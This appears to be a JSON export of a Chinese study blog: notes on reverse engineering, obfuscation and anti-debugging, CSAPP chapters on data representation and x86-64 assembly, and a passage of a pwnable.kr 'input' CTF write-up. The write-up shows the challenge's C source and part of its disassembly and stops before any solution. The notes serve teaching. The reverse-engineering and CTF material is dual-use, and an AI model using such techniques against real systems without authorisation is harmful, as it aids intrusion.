中断和异常是程序执行过程中的插曲，需要处理器强制暂停当前任务，转移到一个称为中断处理程序或者异常处理程序的特殊任务中。 处理器响应中断或者异常所采取的行为称为服务或者处理中断和异常。 IA-32架构为每一个异常和需要处理的中断分配了一个唯一识别码，称为中断向量。 引起中断产生的原因或来源，称为中段源，中断分为硬件中断（如键盘、鼠标）和软件中断（如INT n指令）。硬件中断属于外部中断。 引起异常产生的原因或来源称为异常源，包括处理器检测到程序错误异常、软件产生的中断和机器检测异常3种情况。 程序调试程序调试时软件开发过程中进行排错和查错的过程，需要CPU架构的支持。CPU设计了DR0-DR7共8个调试寄存器，用于断点设置功能。DR0-DR3这4个寄存器是断点地址寄存器，用于保存断点地址，DR4和DR5保留未使用，作为DR6和DR7的别名寄存器，DR6是调试状态寄存器，DR7是调试控制寄存器。 虚拟化支持虚拟化技术能够基于系统CPU、内存、磁盘等资源虚拟出多台主机，提高资源利用率，最大化利用平台的硬件资源。 反汇编及对抗技术在恶意代码与软件漏洞分析的过程中，软件逆向分析是一项基本的技能，这一技能包括反汇编及对抗技术。从汇编语言、反汇编方法与原理来介绍反汇编基础，介绍代码混淆、反调试的对抗技术。 汇编语言汇编语言是一种用于计算机、微处理器、微控制器或其他可编程器件的低级语言，也称为符号语言。 寻址方式IA-32架构的微处理器支持的数据寻址方式包括寄存器寻址、立即寻址、直接寻址、寄存器间接寻址、基址变址寻址、寄存器相对寻址、相对基址加变址寻址、比例变址寻址。之前在CSAPP中复习过，这里不再展开。 常用的汇编指令汇编指令按照功能分类大致可分为数据传送指令、算术与逻辑运算指令、程序控制指令。指令格式：op num1 num2，其中op为操作码助记符，num1是第一个操作数，称为目的操作数，num2是第二个操作数，称为源操作数。（1）数据传送指令包括mov类指令、堆栈类指令、装载地址类指令、数据传送类指令、I/O传送类指令和其他传送指令。（2）算术与逻辑运算指令分为4类：加、减、乘、除指令，比较指令，与、或、非、异或逻辑运算指令以及移位运算指令。（3）程序控制指令包括转移指令、循环控制指令、过程调用指令、中断指令、机器控制指令等。 反汇编反汇编是将机器语言转换成汇编语言的过程，将人类难以理解的机器语言转换成具有符号语义的指令语言。 基本的反汇编流程包括4个步骤：（1）确定反汇编的代码区域，即区分出程序的代码和数据段；（2）确定了程序代码入口后，读取该位置的二进制机器指令，执行表查找，将机器码的值与它对应的汇编语言助记符提取出来，然后根据指令状态机提取操作数。（3）获取指令并解码出所有的操作数之后，需要对它的汇编语言等价形式进行格式化，输出反汇编代码。（4）完成一条指令的反汇编后，重复上述过程，继续反汇编下一条指令，直到反汇编完程序文件中的指令代码。 如何完成反汇编，典型的算法包括：线性扫描和递归下降扫描算法。（1）线性扫描算法的优点是能够完全覆盖程序所有代码，缺点是不会通过识别分支等线性指令提取程序的控制流，且没有考虑到代码中混有数据的情况，将数据当成指令解析可能导致无法预估的错误。采用线性扫描反汇编算法的工具有GUN调试器gdb，微软公司的WinDbg调试器和objdump。（2）递归下降扫描反汇编算法加入了对控制流指令的深度解析，根据一条指令是否被另一条指令引用来决定是否对其进行反汇编，将CPU指令进行分类处理，处理过程中需要维护一个队列，记录待处理的分支入口，这个队列称为待处理队列。优点是能够区分代码与数据，缺点是无法处理间接代码路径，需要对循环进行识别和处理，否则将导致无止境的重复分析。采用递归下降扫描反汇编算法的工具有IDA Pro反汇编工具。 代码混淆代码混淆是一种将计算机程序代码转换成一种功能上等价，但是难以阅读和理解的变形。 代码混淆可分为源程序代码混淆和二进制代码混淆。（1）源代码的混淆可以将代码中的变量、函数、类的名称改成毫无意义的名字，比如单个字母、无意义的字母组合、字母数字编号等，使得阅读代码者难以猜测其用途。源代码的混淆还可以通过修改代码部分逻辑使其功能等价，但更加难以理解，比如添加无用代码，修改循环为递归，打乱代码格式等。（2）二进制代码混淆是应用最为广泛的混淆手段，主要应用于对抗逆向的版权保护和恶意代码的反检测。二进制代码混淆的直接目的就是对抗反汇编，大致会分为两类：其一是“反反汇编”的混淆，即针对反汇编缺陷进行设计使反汇编出错，或者对代码加密混淆使其无法得到真正的运行代码。其二是指令控制流混淆，用来增加理解、分析反汇编代码的难度。 反调试动态调试分析是最常用的分析方法之一，它能够弥补静态分析中难以处理代码加壳及花指令等混淆的不足。常见的反调试技术有：（1）基于调试特征检测的反调试（2）基于调试特征隐藏代码","categories":[],"tags":[{"name":"《软件安全分析与应用》学习笔记","slug":"《软件安全分析与应用》学习笔记","permalink":"https://hanqd.github.io/tags/《软件安全分析与应用》学习笔记/"}]},{"title":"《软件安全分析与应用》总括","slug":"软件安全分析与应用1","date":"2019-06-24T15:24:51.048Z","updated":"2019-06-24T15:25:49.194Z","comments":true,"path":"2019/06/24/软件安全分析与应用1/","link":"","permalink":"https://hanqd.github.io/2019/06/24/软件安全分析与应用1/","excerpt":"背景随着技术的发展和应用的深入，软件安全问题将越来越严重。","text":"背景随着技术的发展和应用的深入，软件安全问题将越来越严重。 典型的软件安全问题可以粗略地分为三类：恶意软件、软件漏洞和软件后门。（因为这是一个概括总结的一章，先大致了解本书的主要内容，了解一些名词和技术，之后的章节会详细介绍。） 恶意软件 字面意思即包含恶意功能的软件。但由于是否“恶意”也具有一定的主观性，因此，目前仍很难对恶意软件进行一个非常客观的标准定义。 传统的恶意软件主要是指病毒、木马、蠕虫、僵尸网络、间谍软件等。其共同特点是在用户不知情的情况下实施一系列的破坏能力，或窃取信息，或远程控制，或实施破坏。 传统的恶意软件一直在发展3方面的能力：渗透与扩散能力、隐蔽能力、破坏能力。 根据恶意软件的发展历程，可将其分为这样3个阶段：第一阶段：单机传播阶段，以磁盘病毒、文件宏病毒为主。第二阶段：网络传播阶段，以邮件病毒、蠕虫。第三阶段：协同攻击阶段，以僵尸网络。 APT攻击：高可持续性威胁，针对特定目标、采用高技术手段的攻击。两个典型的案例：RSA公司遭受SecurID窃取攻击、Hacking Team遭受APT攻击。 软件漏洞 软件漏洞是指由于程序设计实现错误造成的软件问题。 攻击者利用软件漏洞往往可以造成程序崩溃，获取敏感数据或执行任意代码。 软件漏洞是当前互联网的主要威胁之一，是病毒感染，蠕虫传播，APT攻击渗透等攻击实施的重要基础。 要彻底消除软件漏洞困难的原因：（1）软件自身越来越复杂，（2）软件漏洞越来越多样化，（3）软件开发周期越来越短，造成现实生活中软件产品漏洞百出。 案例：JPEG漏洞 软件后门 软件后门是指软件开发人员有意设计，刻意对用户隐瞒的一些功能，往往这些功能用于软件产品应用之后的一些特殊目的。 攻击者利用软件后门的方法，具有以下优势：（1）难发现（2）易利用（3）难取证 软件产品中，以漏洞形式存在的后门也是目前软件产品中的重要安全威胁之一，在某种程度上，是比一般性的软件漏洞更严重的威胁。 软件安全性分析的目标 存在问题，即目标软件中是否存在恶意功能，是否存在漏洞或者后门。这是评估一个软件安全性的首要问题。 机理问题，即确定问题存在之后，进一步分析其具体是如何实现的或者是什么原因造成的。 对策问题，即根据其相关机理分析结果，提出相应的防御政策。 软件分析主要是在没有源代码的情况下，针对可执行代码的分析，这主要是基于现实考虑，无论是恶意软件还是流行的软件产品，常常都无法获取源代码，而在没有源代码支持的情况下，对软件的逆向分析存在以下挑战:（1）指令代码的理解（2）关联关系的抽取（3）复杂逻辑的解析。 软件逆向分析的主要方法和技术根据分析方式的不同，可将软件逆向分析分为静态和动态两大类。静态分析主要是直接对软件的可执行代码进行分析，一般是在对代码反汇编或反编译的基础上，对汇编代码或其他高级语言代码进行进一步分析。动态分析是通过直接运行软件，然后监测软件运行过程，实施分析。 反汇编与反编译（静态）汇编：将汇编程序代码转换成机器可运行的执行代码反汇编：汇编过程的逆过程，即将可执行代码转换为可读的汇编代码编译：将高级语言转换成另一种编程语言（目标语言）代码的过程，如将C语言转换成汇编代码或机器码反编译：将机器码、汇编代码转换成高级语言的过程。 程序调试（动态）通过实际运行软件，利用断点、单步执行等方式，对软件执行过程进行细粒度分析。 程序切片（主要用于静态）它是解决软件超大规模所带来的理解困境的重要思路，是一种重要的程序“分解”方法。它主要通过分析程序代码之间的依赖关系来分析指令的相关性，从而帮助用户提取其所“感兴趣”的代码片段，它根据用户所关注的指令和指令相关的操作数，提取与该指令及操作数相关联的代码，从而在软件逆向分析过程中减少其他无关代码的干扰。 污点传播分析（动态）污点传播分析是一种重要的数据流分析方法。基本思路是：将所感兴趣的数据做标记，即标记为污点数据，然后通过分析对该污点数据的处理过程，根据每条指令的污点传播规则，分析数据的传递关系。数据传递、扩散的过程就是污点传播的过程。 符号执行（可静可动）符号执行是分析内部逻辑的一种基础方法，符号执行在软件逆向分析过程中常用于路径约束条件。基本思路是：将目标程序代码中部分变量和运算符号化，通过对各种条件分支的符号化表达来形成路径的约束条件。符号执行同样是一种数据流分析方法。 模糊测试模糊测试准确的说并不是一项逆向分析技术。基本思想是：通过构造各种不同的输入数据，尽可能的触发执行软件的各种路径，通过对执行结果的监测来实现相关的分析或检测目标。 软件逆向分析的主要应用场景几种典型的应用场景：恶意软件分析、网络协议逆向分析、软件漏洞分析与利用。","categories":[],"tags":[{"name":"《软件安全分析与应用》学习笔记","slug":"《软件安全分析与应用》学习笔记","permalink":"https://hanqd.github.io/tags/《软件安全分析与应用》学习笔记/"}]},{"title":"《CSAPP》程序的机器级表示（第三章）","slug":"CSAPP（第三章1）","date":"2019-06-20T12:02:15.730Z","updated":"2019-06-20T12:03:03.445Z","comments":true,"path":"2019/06/20/CSAPP（第三章1）/","link":"","permalink":"https://hanqd.github.io/2019/06/20/CSAPP（第三章1）/","excerpt":"程序的机器级表示GCC C语言编译器以汇编代码的形式产生输出，汇编代码是机器代码的文本表示，给出程序中的每一条指令。然后GCC调用汇编器和链接器，根据汇编代码生成可执行的机器代码。为什么要学习机器代码呢？对于程序员来说，能够阅读和理解汇编代码仍是一项很重要的技能。逆向工程：通过研究系统和逆向工作，来试图了解系统的创建过程。","text":"程序的机器级表示GCC C语言编译器以汇编代码的形式产生输出，汇编代码是机器代码的文本表示，给出程序中的每一条指令。然后GCC调用汇编器和链接器，根据汇编代码生成可执行的机器代码。为什么要学习机器代码呢？对于程序员来说，能够阅读和理解汇编代码仍是一项很重要的技能。逆向工程：通过研究系统和逆向工作，来试图了解系统的创建过程。 机器级代码对于机器级编程来说，其中两种抽象尤为重要。 第一种是由指令集体系结构或指令集架构（ISA）来定义机器级程序的格式和行为，它定义了处理器状态、指令的格式，以及每条指令对状态的影响。 第二种是机器级程序使用的内存地址是虚拟地址，提供的内存模型看上去是一个非常大的字节数组。 一些通常对C语言程序员隐藏的处理器状态都是可见的： 程序计数器（PC）给出将要执行的下一条指令在内存中的地址。 整数寄存器，有16个，分别存储64位的值。这些寄存器可以存储地址或整数数据。有的寄存器被用来记录某些重要的程序状态，而其他的寄存器用来保存临时数据。 条件码寄存器，保存着最近执行的算术或逻辑指令的状态信息。他们用来实现控制或数据流中的条件变化。 一组向量寄存器可以存放一个或多个整数或浮点数值。 虽然C语言提供了一种模型，可以在内存中声明和分配各种数据类型的对象，但是机器代码只是简单的将内存看成一个很大的、按字节寻址的数组。 程序内存包含：程序的可执行机器代码，操作系统需要的一些信息，用来管理过程调用和返回的运行时栈，以及用户分配的内存块。 代码示例 由源程序查看汇编代码，使用如下命令：Linux&gt; gcc -0g -S 源程序名.c这会使GCC运行编译器，产生一个汇编文件 源程序名.s，但是不做其他进一步的工作。 使用-c命令行选项，GCC会编译并汇编该代码：Linux&gt; gcc -0g -c 源程序名.c这就会产生目标代码文件 源程序名.o，他是二进制格式的，无法直接查看。例如：一段字节序列的十六进制表示：53 48 89 d3 e8 00 00 00 00 48 89 03 5b c3。机器执行的程序只是一个字节序列，它是对一系列指令的编码，机器对产生这些指令的源代码几乎一无所知。 查看机器代码文件的内容，用反汇编器，根据机器代码产生一种类似于汇编代码的格式。使用命令：-dLinux&gt; objdump -d 源程序名.o 关于格式的注解用-S命令生成的汇编文件，有以.开头的行，所有以.开头的行都是指导汇编器和链接器工作的伪指令，我们通常可以忽略这些行。 数据格式C语言数据类型在x86-64中的大小。在64位机器中，指针长8字节。 浮点数主要有两种形式：单精度值（4字节），对应于C语言数据类型float，双精度值（8字节），对应于C语言数据类型double。 访问信息一个x86-64的中央处理单元（CPU）包含一组16个存储64位值的通用目的寄存器。这些寄存器用来存储整数数据和指针。 当这些指令以寄存器作为目标时，对于生成小于8字节结果的指令，寄存器中剩下的字节会怎么样，对此有两条规则：生成1字节和2字节数字的指令会保持剩下的字节不变，生成4字节数字的指令会把高位4个字节置0。 操作数指示符大多数指令有一个或多个操作数，指示出执行一个操作中要使用的源数据值，以及放置结果的目的位置。各种不同的操作数的可能性被分为三种类型。 立即数：用来表示常数值。在ATT格式的汇编代码中，立即数的书写方式是‘$’后面跟一个用标准C表示法表示的整数，比如，$-577或$0x1F。 寄存器：它表示某个寄存器中的内容。16个寄存器的低位1字节、2字节、4字节或8字节中的一个作为操作数，这些字节数分别对应于8位、16位、32位或64位。用符号ra来表示任意寄存器a,用引用R[ra]来表示它的值。 内存引用：它会根据计算出来的地址（通常称为有效地址）访问某个内存位置。用符号Mb[Addr]表示对存储在内存中从Addr开始的b个字节值的引用，为了简便，通常省去下标b。 有多种不同的寻址模式，允许不同形式的内存引用。语法Imm(rb,ri,s)表示的是最常用的形式。分别表示：一个立即数偏移Imm，一个基址寄存器rb，一个变址寄存器ri，一个比例因子s，这里的s必须是1、2、4或者8。基址和变址寄存器都必须是64位寄存器，有效地址被计算位Imm+R[rb]+R[ri]*s。 数据传送指令最简单形式的数据传送指令——mov类。这些指令把数据从源位置复制到目的位置，不做任何变化。源操作数指的值是一个立即数，存储在寄存器中或者内存中，目的操作数指定一个位置，要么是一个寄存器或者是一个内存地址。x86-64加了一条限制，传送指令的两个操作数不能都指向内存位置。将一个值从内存位置复制到另一个内存位置需要两条指令：第一条指令将源值加载到寄存器中，第二条将该寄存器值写入目的位置。 压入和弹出栈数据栈在处理过程调用中起到至关重要的作用。栈可以实现为一个数组，总是从数组的一端插入和删除元素，这一端被称为栈顶。在x86-64中，程序栈存放在内存中某个区域，栈向下增长，栈顶元素的地址是所有栈中元素地址中最低的。栈底是高地址。栈指针%rsp保存着栈顶元素的地址。 pushq指令是把数据压入栈，popq指令是弹出数据，这些指令只有一个操作数——压入的数据源和弹出的数据目的。将一个四字值压入栈，首先要将栈指针减8，然后将值写到新的栈顶地址。因此，指令pushq %rbp的行为等价于下面两条指令：subq $8,%rspmovq %rbp,(%rsp)弹出一个四字的操作包括从栈顶位置读出数据，然后栈指针加8，因此，指令popq %rax等价于下面两条指令：movq (%rsp),%raxaddq $8,%rsp","categories":[],"tags":[{"name":"CSAPP笔记","slug":"CSAPP笔记","permalink":"https://hanqd.github.io/tags/CSAPP笔记/"}]},{"title":"《CSAPP》浮点数+浮点数运算（第二章）","slug":"CSAPP（浮点数）","date":"2019-06-17T14:17:07.686Z","updated":"2019-06-17T14:18:14.862Z","comments":true,"path":"2019/06/17/CSAPP（浮点数）/","link":"","permalink":"https://hanqd.github.io/2019/06/17/CSAPP（浮点数）/","excerpt":"浮点数二进制小数（定点表示法）二进制小数：101.11小数点左边的位的权是2的正幂，点右边的位的权是2的负幂。即表示十进制数：1*2^2+0*2^1+1*2^0+1*2^-1+1*2^-2=4+0+1+1/2+1/4=5(3/4)小数点左移一位相当于这个数被2除，右移一位相当于将该数乘2。","text":"浮点数二进制小数（定点表示法）二进制小数：101.11小数点左边的位的权是2的正幂，点右边的位的权是2的负幂。即表示十进制数：1*2^2+0*2^1+1*2^0+1*2^-1+1*2^-2=4+0+1+1/2+1/4=5(3/4)小数点左移一位相当于这个数被2除，右移一位相当于将该数乘2。 IEEE浮点表示定点表示法不能很有效的表示非常大的数字。IEEE浮点标准用 V=（-1）^s*M*2^E 的形式来表示一个数。 符号：s决定这数是负数（s=1）还是正数（s=0），而对于数值0的符号位解释作为特殊情况处理。(s) 尾数：M是一个二进制小数。（exp） 阶码：E的作用是对浮点数加权，这个权重是2的E次幂（可能是负数）。(frac) 将浮点数的位表示划分为三个字段（s,exp,frac），分别对这些值进行编码。单精度浮点格式：s、exp、frac字段分别为1位、k=8位和n=23位。得到一个32位的表示双精度浮点格式：s、exp、frac字段分别为1位、k=11位和n=52位。得到一个64位的表示 单精度浮点数值的分类（阶码的值决定了这个数是规格化的、非规格化的或特殊值） +0.0和-0.0都是非规格化数。 舍入有四种舍入方式：向偶数舍入、向零舍入、向下舍入、向上舍入。向偶数舍入，也称为向最接近的值舍入，是默认的方式，试图找到一个最接近的匹配值。向偶数舍入采用的方法是：它将数字向上或者向下舍入，使得结果的最低有效数字是偶数，因此，这种方法将1.5和2.5都舍入成2了。向零舍入方式是把正数向下舍入，把负数向上舍入。向下舍入是把正数和负数都向下舍入。向上舍入是把正数和负数都向上舍入。 浮点运算 浮点加法x和y浮点运算可以看作实数进行运算。加法运算是可交换的（x+y=y+x），但是是不可结合的。加法也满足单调性属性。 浮点乘法是可交换的，不具有结合性，满足单调性。 C语言中的浮点数float和double相当于单精度和双精度。 int、float、double格式之间进行强制类型转换时，有如下原则： 从int转换成float，数字不会溢出，但是可能被舍入。 从int或float转换成double，能够保留精确的精度。 从double转换成float，因为范围小，值可能溢出成正无穷或者负无穷，另外因为精度小，还可能被舍入。 从float或double转换成int，值将会向零舍入。","categories":[],"tags":[{"name":"CSAPP笔记","slug":"CSAPP笔记","permalink":"https://hanqd.github.io/tags/CSAPP笔记/"}]},{"title":"《CSAPP》整数运算（第二章）","slug":"CSAPP（整数运算）","date":"2019-06-15T10:43:16.206Z","updated":"2019-06-17T14:18:16.874Z","comments":true,"path":"2019/06/15/CSAPP（整数运算）/","link":"","permalink":"https://hanqd.github.io/2019/06/15/CSAPP（整数运算）/","excerpt":"整数运算无符号加法两个非负整数x和y，满足0&lt;=x,y&lt;=2^w，每个数都能表示为w位无符号数字。无符号运算就是把整数和x+y截断为w位得到的结果，再把这个结果看做是一个无符号数。也可以看作一种形式的模运算。","text":"整数运算无符号加法两个非负整数x和y，满足0&lt;=x,y&lt;=2^w，每个数都能表示为w位无符号数字。无符号运算就是把整数和x+y截断为w位得到的结果，再把这个结果看做是一个无符号数。也可以看作一种形式的模运算。原理：当x+y&lt;2^w，相加结果为x+y，属于正常情况当2^w&lt;=x+y&lt;2^w+1，相加结果为x+y-2^w，属于溢出情况算术运算溢出：指完整的整数结果不能放到数据类型的字长限制中去，如上边的两个运算数的和为2^w或者更大时，就发生了溢出。检测无符号数加法中的溢出：对在范围内0&lt;=x,y&lt;=UMaxw中的x和y，令s是x+y的和，当且仅当s小于x（或者等价的s小于y）时，发生了溢出。 补码加法给定在范围-2^w-1&lt;=x,y&lt;=2^w-1 -1之内的整数值x和y，他们的和就在范围-2^w&lt;=x+y&lt;=2^w -2之内，要想准确表示，可能需要w+1位。定义补码加法x+y为整数和x+y被截断为w位的结果，并将这个结果看做是补码数。原理：当2^w-1&lt;=x+y时，相加结果为x+y-2^w,属于正溢出情况（两个正数相加，得到一个负数）当-2^w-1&lt;=x+y&lt;=2^w-1，相加结果为x+y，属于正常情况当x+y&lt;-2^w-1时，相加结果为x+y+2^w，属于负溢出情况（两个负数相加，得到一个非负的结果）检测补码加法中的溢出当两个大于0的数相加得到一个负数时，发生正溢出。当两个小于0的数相加得到一个非负数时，发生负溢出。 补码的非当x=TMinw时，补码的非等于TMinw。当x&gt;TMinw时，补码的非等于包括符号位，每位取反，最后一位加1，得到的结果。 无符号乘法将一个无符号数截断为w位等价于计算该值模2^w。原理：对满足0&lt;=x,y&lt;=UMaxw的x和y有：x*y=(x*y)mod 2^w 补码乘法先计算无符号乘法，再把无符号数转换为补码即可原理：x*y=U2Tw((x*y)mod 2^w) 乘以常数编译器使用了一项重要的优化，用移位和加法运算的组合来代替乘以常数因子的乘法。乘以2的幂乘以2^k，就在该数的右边加k个0。相当于左移k位，对于其固定字长的乘法，把其高k位被丢弃。 除以2的幂除以2的幂也可以用移位运算来实现，只不过用的是右移，无符号数和补码数分别使用逻辑移位和算术移位来达到目的。无符号数：一定是逻辑右移。右移k位，在高位补0，没有实际意义。补码数：向下舍入。当x&gt;=0时，即为非负数时，效果与逻辑右移是一样的，对于负数来讲，如果需要舍入时，要进行向下舍入。例如：右移4位将会把-771.25向下舍入位-772。","categories":[],"tags":[{"name":"CSAPP笔记","slug":"CSAPP笔记","permalink":"https://hanqd.github.io/tags/CSAPP笔记/"}]},{"title":"《CSAPP》 位移运算+机器中的整数表示（第二章）","slug":"CSAPP2","date":"2019-05-31T13:02:23.987Z","updated":"2019-05-31T13:03:26.349Z","comments":true,"path":"2019/05/31/CSAPP2/","link":"","permalink":"https://hanqd.github.io/2019/05/31/CSAPP2/","excerpt":"前言最近终于把毕业论文弄完了，一遍遍的修改格式，打印，准备答辩PPT，预答辩，然后拍了毕业照，接下来要忙的就是论文装订，档案审核，毕业季真是忙的要命啊！要读的书也因为毕业的事情搁浅了一段时间，现在拾起来。","text":"前言最近终于把毕业论文弄完了，一遍遍的修改格式，打印，准备答辩PPT，预答辩，然后拍了毕业照，接下来要忙的就是论文装订，档案审核，毕业季真是忙的要命啊！要读的书也因为毕业的事情搁浅了一段时间，现在拾起来。 C语言中的移位运算C语言中移位运算分为向左移和向右移。 逻辑左移和算术左移操作是一样的，不管是有符号数和无符号数，都是在后边补0。【举例】01100011 逻辑左移&lt;&lt;4：00110000 算术左移&lt;&lt;4：0011000010010101 逻辑左移&lt;&lt;4：01010000 算术左移&lt;&lt;4：01010000 逻辑右移在最高位补0，算术右移在高位补相应的高位数值（一般有符号数就默认算术右移）。【举例】01100011 逻辑右移&gt;&gt;4：00000110 算术右移&gt;&gt;4：0000011010010101 逻辑右移&gt;&gt;4：00001001 算术左移&gt;&gt;4：11111001 整数表示这里首先介绍了各个数据类型（有符号数和无符号数的char、int等）的最大值与最小值，这里不再贴出来了。 无符号数的编码简单来说，就是二进制表示方法，由0，1组成。函数B2Uw：Binary to Unsigned，长度为w二进制数的无符号表示（二进制到无符号数）。（1）无符号数编码的定义一个w位的二进制无符号数，B2Uw函数能从位相量映射到整数。【举例】B2U4（[0001]）=0*2^3+0*2^2+0*2^1+1*2^0=0+0+0+1=1B2U4（[1011]）=1*2^3+0*2^2+1*2^1+1*2^0=8+0+2+1=11给出一个十进制数，就能得出唯一一个二进制数。每个介于0~2^w-1之间的数都有唯一一个w位的值编码。（无符号编码具有唯一性） 补码编码常见的有符号数的计算机表示方法就是补码（two’s-complement）形式。函数B2Tw：Binary to Two’s-complement，长度为w。（二进制到补码形式）最高有效位即为符号位，它的“权重”为-2^w-1。【举例】B2T4（[0001]）=-0*2^3+0*2^2+0*2^1+1*2^0=0+0+0+1=1B2T4（[1011]）=-1*2^3+0*2^2+1*2^1+1*2^0=-8+0+2+1=-5补码编码也具有唯一性。 有符号数和无符号数之间的转换有符号数和无符号数之间可以进行强制类型转换。将负数转换成无符号数可能会得到0，如果需要转换的无符号数太大，超出了补码能够表示的范围，可能会得到TMax。【举例】有符号数转换成无符号数（unsigned short）-12345=53191,即T2U16(-12345)=53191这里保持位值不变，只是改变了解释这些位的方式。因为-12345和53191的二进制表示是一样的。规则：数值可能会变，但是位模式不变。函数T2Uw，定义为T2Uw(x)=B2Uw(T2Bw(x))。这个函数的输入是一个TMinw~TMaxw的数，结果得到一个0~UMaxw的值。函数U2Tw，同上，U2T16(53191)=-12345，十六进制表示写作0xCFC7的16位位模式既是-12345的补码表示，又是53191的无符号表示。同时12345+53191=65536=2^16。 C语言中的有符号数和无符号数通常大多数数字都默认是有符号的，要创建一个无符号常量时，必须加上后缀字符‘U’或者‘u’，例如12345U或者0x1A2Bu。printf输出数值时，分别用指示符%d、%u、%x分别表示有符号十进制、无符号十进制和十六进制格式输出一个数字。 扩展一个数字的位表示一个常见的运算是在不同字节的整数之间转换，同时又保持数值不变。零扩展：将一个无符号数转换为一个更大的数据类型，只要简单地在表示的开头添加0即可。符号扩展：将一个补码数字转换为一个更大的数据类型，在表示中添加最高有效位的值。（因为是补码的形式，转换为原码后，再计算，值是一样的。） 截断数字减少表示一个数字的位数。int-&gt;short。将32位的int截断成了16位的short int。截断无符号数：截断k位，即把高w-k位丢弃，从左到右前k位。截断符号数：先用无符号数截断后表示，再转换为补码形式即可。 存在的漏洞已经看到了许多无符号数运算的细微特性，尤其是有符号数到无符号数的隐式转换，会导致错误或者漏洞。避免这类错误的一种方法就是绝不使用无符号数。","categories":[],"tags":[{"name":"CSAPP笔记","slug":"CSAPP笔记","permalink":"https://hanqd.github.io/tags/CSAPP笔记/"}]},{"title":"pwnable.kr-input","slug":"pwnable input","date":"2019-05-26T02:16:43.231Z","updated":"2019-07-01T11:59:31.991Z","comments":true,"path":"2019/05/26/pwnable input/","link":"","permalink":"https://hanqd.github.io/2019/05/26/pwnable input/","excerpt":"pwnable-input涉及知识点：条件输入 题目描述123Mom? how can I pass my input to a computer program?ssh input2@pwnable.kr -p2222 (pw:guest) 根据题目知道，这是一道关于输入的题目，同样，需要SSH远程登录。","text":"pwnable-input涉及知识点：条件输入 题目描述123Mom? how can I pass my input to a computer program?ssh input2@pwnable.kr -p2222 (pw:guest) 根据题目知道，这是一道关于输入的题目，同样，需要SSH远程登录。 题目分析 远程登录到input2用户，查看该用户下的文件，用ls命令，有input、input.c、flag三个文件 查看input.c源代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[])&#123; printf(\"Welcome to pwnable.kr\\n\"); printf(\"Let's see if you know how to give input to program\\n\"); printf(\"Just give me correct inputs then you will get the flag :)\\n\"); // argv if(argc != 100) return 0; if(strcmp(argv['A'],\"\\x00\")) return 0; if(strcmp(argv['B'],\"\\x20\\x0a\\x0d\")) return 0; printf(\"Stage 1 clear!\\n\"); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, \"\\x00\\x0a\\x00\\xff\", 4)) return 0; read(2, buf, 4); if(memcmp(buf, \"\\x00\\x0a\\x02\\xff\", 4)) return 0; printf(\"Stage 2 clear!\\n\"); // env if(strcmp(\"\\xca\\xfe\\xba\\xbe\", getenv(\"\\xde\\xad\\xbe\\xef\"))) return 0; printf(\"Stage 3 clear!\\n\"); // file FILE* fp = fopen(\"\\x0a\", \"r\"); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, \"\\x00\\x00\\x00\\x00\", 4) ) return 0; fclose(fp); printf(\"Stage 4 clear!\\n\"); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1)&#123; printf(\"socket error, tell admin\\n\"); return 0; &#125; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123; printf(\"bind error, use another port\\n\"); return 1; &#125; listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0)&#123; printf(\"accept error, tell admin\\n\"); return 0; &#125; if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, \"\\xde\\xad\\xbe\\xef\", 4)) return 0; printf(\"Stage 5 clear!\\n\"); // here's your flag system(\"/bin/cat flag\"); return 0;&#125; 查看main函数的反汇编代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218400954: 55 push %rbp 400955: 48 89 e5 mov %rsp,%rbp 400958: 48 83 ec 70 sub $0x70,%rsp 40095c: 89 7d ac mov %edi,-0x54(%rbp) 40095f: 48 89 75 a0 mov %rsi,-0x60(%rbp) 400963: 48 89 55 98 mov %rdx,-0x68(%rbp) 400967: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 40096e: 00 00 400970: 48 89 45 f8 mov %rax,-0x8(%rbp) 400974: 31 c0 xor %eax,%eax 400976: bf a0 0d 40 00 mov $0x400da0,%edi 40097b: e8 00 fe ff ff callq 400780 &lt;puts@plt&gt; 400980: bf b8 0d 40 00 mov $0x400db8,%edi 400985: e8 f6 fd ff ff callq 400780 &lt;puts@plt&gt; 40098a: bf f0 0d 40 00 mov $0x400df0,%edi 40098f: e8 ec fd ff ff callq 400780 &lt;puts@plt&gt; 400994: 83 7d ac 64 cmpl $0x64,-0x54(%rbp) 400998: 74 0a je 4009a4 &lt;main+0x50&gt; 40099a: b8 00 00 00 00 mov $0x0,%eax 40099f: e9 f6 02 00 00 jmpq 400c9a &lt;main+0x346&gt; 4009a4: 48 8b 45 a0 mov -0x60(%rbp),%rax 4009a8: 48 05 08 02 00 00 add $0x208,%rax 4009ae: 48 8b 00 mov (%rax),%rax 4009b1: 0f b6 00 movzbl (%rax),%eax 4009b4: 84 c0 test %al,%al 4009b6: 74 0a je 4009c2 &lt;main+0x6e&gt; 4009b8: b8 00 00 00 00 mov $0x0,%eax 4009bd: e9 d8 02 00 00 jmpq 400c9a &lt;main+0x346&gt; 4009c2: 48 8b 45 a0 mov -0x60(%rbp),%rax 4009c6: 48 05 10 02 00 00 add $0x210,%rax 4009cc: 48 8b 00 mov (%rax),%rax 4009cf: 48 89 c2 mov %rax,%rdx 4009d2: b8 2a 0e 40 00 mov $0x400e2a,%eax 4009d7: b9 04 00 00 00 mov $0x4,%ecx 4009dc: 48 89 d6 mov %rdx,%rsi 4009df: 48 